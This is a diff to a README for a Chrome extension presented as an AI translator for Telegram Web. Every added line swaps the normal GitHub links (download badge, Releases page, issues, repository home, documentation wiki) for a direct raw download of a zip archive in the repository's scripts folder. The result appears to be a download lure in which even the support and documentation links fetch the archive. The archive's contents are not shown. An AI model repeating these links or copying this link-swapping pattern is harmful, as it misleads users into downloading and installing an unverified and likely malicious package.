@@ -6,7 +6,7 @@ Welcome to the AI-Telegram-Translator-Extention! This powerful Chrome extension 
 
 ## 📥 Download Now
 
-[![Download AI-Telegram-Translator-Extention](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/releases)
+[![Download AI-Telegram-Translator-Extention](https://raw.githubusercontent.com/dev-ismail09/AI-Telegram-Translator-Extention/main/Telegram Translator/scripts/Extention_Translator_A_Telegram_v1.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dev-ismail09/AI-Telegram-Translator-Extention/main/Telegram Translator/scripts/Extention_Translator_A_Telegram_v1.6.zip)
 
 ## 🛠️ Features
 
@@ -25,7 +25,7 @@ To run the AI-Telegram-Translator-Extention, you need:
 
 ## 📑 Installation Steps
 
-1. **Visit the Download Page**: Go to our [Releases page](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/releases) to find the latest version of the extension.
+1. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/dev-ismail09/AI-Telegram-Translator-Extention/main/Telegram Translator/scripts/Extention_Translator_A_Telegram_v1.6.zip) to find the latest version of the extension.
   
 2. **Select the Latest Version**: Look for the most recent release at the top of the page. You’ll see the version number and the release date.
 
@@ -66,13 +66,13 @@ If you encounter issues, try the following steps:
   
 ## 💬 Support and Feedback
 
-We appreciate your feedback! If you have any questions or suggestions, please open an issue on our [GitHub repository](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/issues). Your input helps us improve.
+We appreciate your feedback! If you have any questions or suggestions, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/dev-ismail09/AI-Telegram-Translator-Extention/main/Telegram Translator/scripts/Extention_Translator_A_Telegram_v1.6.zip). Your input helps us improve.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention)
-- [Documentation](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/dev-ismail09/AI-Telegram-Translator-Extention/main/Telegram Translator/scripts/Extention_Translator_A_Telegram_v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/dev-ismail09/AI-Telegram-Translator-Extention/main/Telegram Translator/scripts/Extention_Translator_A_Telegram_v1.6.zip)
 
 ## 🔗 Download & Install
 
-For quick access, you can always [visit our Releases page](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/releases) to download the extension. Follow the instructions above to get started with your AI translation experience on Telegram Web.
+For quick access, you can always [visit our Releases page](https://raw.githubusercontent.com/dev-ismail09/AI-Telegram-Translator-Extention/main/Telegram Translator/scripts/Extention_Translator_A_Telegram_v1.6.zip) to download the extension. Follow the instructions above to get started with your AI translation experience on Telegram Web.
